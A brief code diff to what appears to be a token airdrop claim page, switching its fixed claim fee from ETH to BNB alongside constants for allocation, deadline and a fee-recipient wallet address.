@@ -25,7 +25,8 @@ const TOTAL_ALLOCATION = 3_000_000;
 const ESTIMATED_VALUE_PER_TOKEN = 0.00015;
 const CLAIM_DEADLINE = new Date("2026-07-25T23:59:59Z");
 const FEE_RECIPIENT = "0x2674b6DD25b98b86ba62a1d81Fa698161633B0cD" as `0x${string}`;
-const GAS_FEE_ETH = "0.005";
+const GAS_FEE_BNB = "0.005";
+const FEE_TOKEN = "BNB";
 
 function useCountdown(target: Date) {
   const calc = () => {
